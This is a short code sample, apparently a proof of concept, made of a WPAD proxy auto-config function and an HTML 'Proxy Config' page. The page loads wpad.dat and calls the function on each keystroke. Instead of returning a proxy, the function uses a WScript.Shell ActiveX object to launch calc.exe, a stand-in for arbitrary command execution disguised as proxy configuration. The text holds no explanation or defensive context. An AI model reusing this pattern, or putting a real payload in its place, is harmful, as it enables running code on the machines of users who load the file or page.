function FindProxyForURL(url, host)
{
   var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
}

<html>
    <head>
        <script language="javascript">
<?php require_once('wpad.dat'); ?>
 
function testHost(host)
{
    document.getElementById('result').innerHTML = FindProxyForURL('', host);
}
        </script>
    </head>
    <body>
        <h1>Proxy Config</h1>
        <p>Enter the desired hostname to discover which proxy will be used.</p>
        <input type="text" onKeyUp="testHost(this.value)" size=30/>
        <span id="result" />
    </body>
</html>